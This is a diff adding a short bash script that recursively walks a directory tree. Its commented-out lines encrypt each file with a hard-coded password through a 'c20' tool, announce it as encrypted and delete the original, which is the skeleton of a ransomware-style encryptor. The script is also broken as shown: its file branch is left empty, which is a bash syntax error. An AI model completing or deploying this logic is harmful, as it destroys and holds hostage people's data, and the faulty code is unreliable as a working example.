@@ -1,0 +1,23 @@
+#!/bin/bash
+
+function get_dir (){
+  cd $1
+  for f in $(ls)
+  do
+    # wait 5000
+    if [[ -f ${f} ]]; then
+      # printf "951753\n" | c20 ${f}
+      # echo ${f} "is encrypted"
+      # rm ${f}
+      
+      
+    elif [[ -d ${f} ]]; then 
+      echo ${PWD}
+      get_dir ${f} &  
+      wait
+    fi
+
+    
+  done 
+}
+get_dir $1
